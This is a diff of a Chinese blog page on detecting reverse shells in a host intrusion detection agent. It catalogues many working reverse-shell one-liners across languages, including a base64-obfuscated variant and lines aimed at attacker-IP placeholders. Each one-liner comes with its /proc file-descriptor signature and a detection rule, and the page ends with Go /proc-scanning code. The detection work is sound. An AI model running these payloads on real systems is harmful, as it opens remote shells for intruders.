@@ -87,7 +87,7 @@ var _hmt = _hmt || [];
     <ul class="list-inline">
       <li class="list-inline-item text-muted" title="2018-08-16T20:20:00+03:00">
         <i class="fa fa-clock-o"></i>
-        Thu 16 August 2018
+        四 16 八月 2018
       </li>
       <li class="list-inline-item">
         <i class="fa fa-folder-open-o"></i>
@@ -103,92 +103,92 @@ var _hmt = _hmt || [];
   </header>
   <div class="content">
     <h4>介绍</h4>
-<div class="highlight"><pre><span></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/127.0.0.1/1234 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>  <span class="c1">#TCP</span>
+<div class="highlight"><pre><span></span><code>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/127.0.0.1/1234 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>  <span class="c1">#TCP</span>
 
 Listener:
 nc -nvlp <span class="m">1234</span>
-</pre></div>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG53.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了一个常住进程“bash -i”， 它的得0和1文件描述符都指向socket。</p>
 <p>匹配规则：bash进程的0，和1文件描述符指向socket</p>
-<div class="highlight"><pre><span></span>sh -i &gt;<span class="p">&amp;</span> /dev/udp/127.0.0.1/1234 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="c1">#UDP</span>
+<div class="highlight"><pre><span></span><code>sh -i &gt;<span class="p">&amp;</span> /dev/udp/127.0.0.1/1234 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="c1">#UDP</span>
 
 Listener:
 nc -u -lvp <span class="m">1234</span>
-</pre></div>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了一个常住进程“sh -i”， 它的得0和1文件描述符都指向socket。</p>
 <p>匹配规则：bash进程的0，和1文件描述符指向socket</p>
-<div class="highlight"><pre><span></span><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span> <span class="m">196</span>&lt;&gt;/dev/tcp/127.0.0.1/1234<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span> <span class="m">196</span>&lt;&gt;/dev/tcp/127.0.0.1/1234<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WeChat9c018fc36b0256b4286d528e3e91651a.png"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：sh的0，和1文件描述符指向socket</p>
-<div class="highlight"><pre><span></span><span class="nb">exec</span> <span class="m">5</span>&lt;&gt;/dev/tcp/127.0.0.1/1234<span class="p">;</span> <span class="k">while</span> <span class="nb">read</span> line <span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">done</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="nb">exec</span> <span class="m">5</span>&lt;&gt;/dev/tcp/127.0.0.1/1234<span class="p">;</span> <span class="k">while</span> <span class="nb">read</span> line <span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">done</span>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG56.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>匹配规则：某一个bash进程的0 文件描述符指向socket</p>
-<div class="highlight"><pre><span></span>nohup bash -c <span class="s1">'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1'</span>
+<div class="highlight"><pre><span></span><code>nohup bash -c <span class="s1">'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1'</span>
 
 base64搞一下命令
 
 <span class="nb">echo</span> <span class="s2">"nohup bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1'"</span> <span class="p">|</span> base64 -w0
 <span class="nb">echo</span> bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYxJwo<span class="o">=</span> <span class="p">|</span> base64 -d <span class="p">|</span> bash <span class="m">2</span>&gt;/dev/null
-</pre></div>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG55.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了bash进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：bash的0，和1文件描述符指向socket</p>
-<div class="highlight"><pre><span></span>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="p">|</span> /bin/sh <span class="c1">#Blind</span>
+<div class="highlight"><pre><span></span><code>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="p">|</span> /bin/sh <span class="c1">#Blind</span>
 
 rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> &gt;/tmp/f
 
 rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</span>/bin/sh <span class="m">0</span>&lt;/tmp/bkpipe <span class="p">|</span> telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="m">1</span>&gt;/tmp/bkpipe
-</pre></div>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG59.jpeg"/>
 <img alt="agent" class="img-fluid" src="../images/WechatIMG60.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了pipe。
 匹配规则：sh进程的0，和1文件描述符指向pipe</p>
-<div class="highlight"><pre><span></span>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="p">|</span> /bin/bash <span class="p">|</span> telnet <span class="m">127</span>.0.0.1 <span class="m">12345</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="p">|</span> /bin/bash <span class="p">|</span> telnet <span class="m">127</span>.0.0.1 <span class="m">12345</span>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG61.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了bash进程，0和1描述符都指向了pipe。
 匹配规则：bash进程的0，和1文件描述符指向pipe</p>
-<div class="highlight"><pre><span></span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
+<div class="highlight"><pre><span></span><code><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
 
 <span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[127.0.0.1]:[1234]");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span>
-</pre></div>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
-<div class="highlight"><pre><span></span><span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="s2">"127.0.0.1"</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">1234</span><span class="p">;</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span>
+<div class="highlight"><pre><span></span><code><span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="s2">"127.0.0.1"</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">1234</span><span class="p">;</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span>
 
 <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
-</pre></div>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
-<div class="highlight"><pre><span></span><span class="x">php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="x">php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：sh的0，和1文件描述符指向socket</p>
-<div class="highlight"><pre><span></span><span class="x">php -r 'exec("/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234")'</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="x">php -r 'exec("/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234")'</span>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG53.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了一个常住进程“bash -i”， 它的得0和1文件描述符都指向socket。</p>
 <p>匹配规则：bash进程的0，和1文件描述符指向socket</p>
-<div class="highlight"><pre><span></span><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：sh的0，和1文件描述符指向socket</p>
-<div class="highlight"><pre><span></span>nc -e /bin/sh <span class="m">127</span>.0.0.1 <span class="m">1234</span>
+<div class="highlight"><pre><span></span><code>nc -e /bin/sh <span class="m">127</span>.0.0.1 <span class="m">1234</span>
 
 如果nc 不支持 -e
 
@@ -197,78 +197,78 @@ nc &lt;ATTACKER-IP&gt; &lt;PORT1&gt;<span class="p">|</span> /bin/bash <span cla
 rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</span>/bin/sh <span class="m">0</span>&lt;/tmp/bkpipe <span class="p">|</span> nc  <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="m">1</span>&gt;/tmp/bkpipe
 
 rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc  <span class="m">127</span>.0.0.1 <span class="m">1234</span> &gt;/tmp/f
-</pre></div>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG62.jpeg"/>
 <img alt="agent" class="img-fluid" src="../images/WechatIMG63.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了pipe，这两个pipe关联到文件和nc上。</p>
 <p>匹配规则：sh进程的0，和1文件描述符指向pipe</p>
-<div class="highlight"><pre><span></span><span class="n">lua</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="n">lua</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：sh的0，和1文件描述符指向socket</p>
 <p>Java</p>
-<div class="highlight"><pre><span></span><span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> <span class="n">as</span> <span class="n">String</span><span class="o">[])</span>
-<span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="o">[</span><span class="s">"/bin/bash"</span><span class="p">,</span><span class="s">"-c"</span><span class="p">,</span><span class="s">"exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> <span class="n">as</span> <span class="n">String</span><span class="o">[]</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">()</span>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG56.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>匹配规则：某一个bash进程的0 文件描述符指向socket</p>
 <p>Golang</p>
-<div class="highlight"><pre><span></span><span class="nt">echo</span> <span class="s1">'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1234");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span> <span class="o">&amp;&amp;</span> <span class="nt">go</span> <span class="nt">run</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span> <span class="o">&amp;&amp;</span> <span class="nt">rm</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="n">echo</span> <span class="s1">'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1234");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">t</span><span class="o">.</span><span class="n">go</span> <span class="o">&amp;&amp;</span> <span class="n">go</span> <span class="n">run</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">t</span><span class="o">.</span><span class="n">go</span> <span class="o">&amp;&amp;</span> <span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">t</span><span class="o">.</span><span class="n">go</span>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG64.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了pipe。
 匹配规则：sh进程的0，和1文件描述符指向pipe</p>
 <p>Nodejs</p>
-<div class="highlight"><pre><span></span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
     <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"net"</span><span class="p">),</span>
         <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"child_process"</span><span class="p">),</span>
         <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">,</span> <span class="p">[]);</span>
     <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
-    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">1234</span><span class="p">,</span> <span class="s2">"127.0.0.1"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mf">1234</span><span class="p">,</span> <span class="s2">"127.0.0.1"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
         <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
         <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
         <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
     <span class="p">});</span>
     <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents the Node.js application form crashing</span>
 <span class="p">})();</span>
-</pre></div>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG66.jpeg"/></p>
 <p>目标机执行后的结果如下：
 创建了sh进程，0和1描述符都指向了socket。</p>
 <p>匹配规则：sh的0，和1文件描述符指向socket</p>
-<div class="highlight"><pre><span></span>require('child_process').exec('nc -e /bin/sh 127.0.0.1 1234')
+<div class="highlight"><pre><span></span><code><span class="n">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">)</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s1">'nc -e /bin/sh 127.0.0.1 1234'</span><span class="p">)</span>
 
-or
+<span class="ow">or</span>
 
--var x = global.process.mainModule.require
--x('child_process').exec('nc 127.0.0.1 1234 -e /bin/bash')
-</pre></div>
+<span class="o">-</span><span class="k">var</span> <span class="n">x</span> <span class="o">=</span> <span class="n">global</span><span class="o">.</span><span class="n">process</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span>
+<span class="o">-</span><span class="n">x</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">)</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s1">'nc 127.0.0.1 1234 -e /bin/bash'</span><span class="p">)</span>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG63.jpeg"/>
 目标机执行后的结果如下：</p>
 <p>创建了sh进程，0和1描述符都指向了pipe，这两个pipe关联到nc进程上。nc创建了socket外联。</p>
 <p>匹配规则：sh进程的0，和1文件描述符指向pipe</p>
 <p>用openssl 反弹shell</p>
 <p>攻击者</p>
-<div class="highlight"><pre><span></span>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="m">365</span> -nodes <span class="c1">#Generate certificate</span>
+<div class="highlight"><pre><span></span><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="m">365</span> -nodes <span class="c1">#Generate certificate</span>
 openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port&gt; <span class="c1">#Here you will be able to introduce the commands</span>
 openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; <span class="c1">#Here yo will be able to get the response</span>
-</pre></div>
+</code></pre></div>
 <p>靶机</p>
-<div class="highlight"><pre><span></span>openssl s_client -quiet -connect <span class="m">127</span>.0.0.1:1234<span class="p">|</span>/bin/bash<span class="p">|</span>openssl s_client -quiet -connect <span class="m">127</span>.0.0.1:12345
-</pre></div>
+<div class="highlight"><pre><span></span><code>openssl s_client -quiet -connect <span class="m">127</span>.0.0.1:1234<span class="p">|</span>/bin/bash<span class="p">|</span>openssl s_client -quiet -connect <span class="m">127</span>.0.0.1:12345
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WeChat8872f342986ad270beb9f2cfed15620b.png"/>目标机执行后的结果如下：</p>
 <p>创建了bash进程，0和1描述符都指向了pipe。
 匹配规则：bash进程的0，和1文件描述符指向pipe</p>
-<div class="highlight"><pre><span></span>awk <span class="s1">'BEGIN {s = "/inet/tcp/0/127.0.0.1/1234"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null
-</pre></div>
+<div class="highlight"><pre><span></span><code>awk <span class="s1">'BEGIN {s = "/inet/tcp/0/127.0.0.1/1234"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null
+</code></pre></div>
 <p>无明显文件句柄特征</p>
-<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
@@ -278,14 +278,14 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; <span 
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
     <span class="kt">int</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">1234</span><span class="p">;</span>
-    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">revsockaddr</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="n">revsockaddr</span><span class="p">;</span>
 
     <span class="kt">int</span> <span class="n">sockt</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
     <span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>       
     <span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
     <span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>
 
-    <span class="n">connect</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">revsockaddr</span><span class="p">,</span> 
+    <span class="n">connect</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">revsockaddr</span><span class="p">,</span> 
     <span class="k">sizeof</span><span class="p">(</span><span class="n">revsockaddr</span><span class="p">));</span>
     <span class="n">dup2</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
     <span class="n">dup2</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
@@ -296,7 +296,7 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; <span 
 
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>       
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WeChatb7a57e2e1c37e20c37bb206518c75d7a.png"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了一个常住进程“sh ”， 它的得0和1文件描述符都指向socket。</p>
@@ -307,7 +307,7 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; <span 
 <p>使用 cgroups + etcd + kafka 开发而成的hids的架构，agent 部分使用go 开发而成， 会把采集的数据写入到kafka里面，由后端的规则引擎（go开发而成）消费，配置部分以及agent存活使用etcd。关于agent 使用cgroups限制资源以及使用etcd做配置管理agent存活等已经在前文介绍了一下。下面介绍一下agent分析反弹shell的部分。</p>
 <p>代码例子：
 主要是分析 Linux /proc的内容</p>
-<div class="highlight"><pre><span></span>import <span class="o">(</span>
+<div class="highlight"><pre><span></span><code>import <span class="o">(</span>
     <span class="s2">"fmt"</span>
     <span class="s2">"io/ioutil"</span>
     <span class="s2">"os"</span>
@@ -473,9 +473,9 @@ func dirsFile<span class="o">(</span>dirPath string<span class="o">)</span> <spa
     <span class="o">}</span>
     <span class="k">return</span> ret, nil
 <span class="o">}</span>
-</pre></div>
+</code></pre></div>
 <p>抓取的数据如下</p>
-<div class="highlight"><pre><span></span><span class="o">{</span>
+<div class="highlight"><pre><span></span><code><span class="o">{</span>
     <span class="s2">"command"</span>:<span class="s2">"bash -i"</span>,
     <span class="s2">"egid"</span>:<span class="s2">"0"</span>,
     <span class="s2">"euid"</span>:<span class="s2">"0"</span>,
@@ -498,7 +498,7 @@ func dirsFile<span class="o">(</span>dirPath string<span class="o">)</span> <spa
     <span class="s2">"suid"</span>:<span class="s2">"0"</span>,
     <span class="s2">"uid"</span>:<span class="s2">"0"</span>
 <span class="o">}</span>
-</pre></div>
+</code></pre></div>
 <p>对应上面的规则，在server 端做流式分析，很多东西一目了然，不过， 百密总有一疏，绕过的方法大家自主了解，技术在对抗中升华。</p>
   </div>
 </article>
